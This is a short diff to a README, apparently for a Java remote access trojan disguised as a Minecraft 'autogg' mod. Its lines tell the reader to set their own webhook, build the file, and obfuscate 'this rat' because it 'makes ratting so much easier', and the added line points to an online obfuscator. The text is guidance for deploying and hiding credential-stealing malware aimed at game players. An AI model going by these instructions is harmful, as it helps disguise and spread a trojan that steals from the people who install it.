@@ -5,3 +5,4 @@
 #### github.quantizr.autogg.guis
 ### then once you've changed the webhook you build the file! if you dont know how to build a java file then just google it 
 ### PLEASE obfuscate this rat there is so many online obfuscators and it makes ratting so much easier
+### heres a good online obfuscator: https://branchlock.net/obfuscator/
